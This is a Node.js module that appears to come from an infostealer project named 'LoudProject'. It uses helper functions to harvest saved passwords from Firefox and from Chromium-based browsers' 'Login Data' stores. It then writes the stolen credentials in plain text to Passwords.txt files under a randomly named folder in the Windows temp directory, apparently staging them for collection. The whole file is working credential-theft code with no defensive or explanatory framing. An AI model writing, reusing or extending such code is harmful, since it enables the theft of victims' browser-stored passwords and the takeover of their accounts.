const { rdm } = require("../../../data/Config");
const { paths } = require("../../../data/paths");
const fs = require("fs");
const path = require("path");
const getFirefoxPasswords = require("../../../functions/browsers/GetGeckoPasswords");
const { getPasswords } = require("../../../functions/browsers/getPasswords");

async function Save() {
  let passwords = "";
  let geckpasswords = (await getFirefoxPasswords()) || "";
  if (geckpasswords !== "" && geckpasswords !== null) {
    const dirPath = path.join(process.env.TEMP, `LoudProject\\${rdm}\\Gecko`);

    if (!geckpasswords.includes("PASSWORD:")) return;

    if (!fs.existsSync(dirPath)) {
      fs.mkdirSync(dirPath, { recursive: true });
    }

    const filePath = path.join(dirPath, "Passwords.txt");

    fs.writeFileSync(filePath, geckpasswords);
  }

  for (let i = 0; i < paths.length; i++) {
    if (fs.existsSync(paths[i] + "\\Login Data")) passwords += (await getPasswords(paths[i])) || "";
  }
  if (!passwords.includes("PASSWORD:")) return;
  const dirPath = path.join(process.env.TEMP, `LoudProject\\${rdm}\\Chromium`);

  if (!fs.existsSync(dirPath)) {
    fs.mkdirSync(dirPath, { recursive: true });
  }

  const filePath = path.join(dirPath, "Passwords.txt");
  fs.writeFileSync(filePath, passwords);
}

module.exports = { Save };
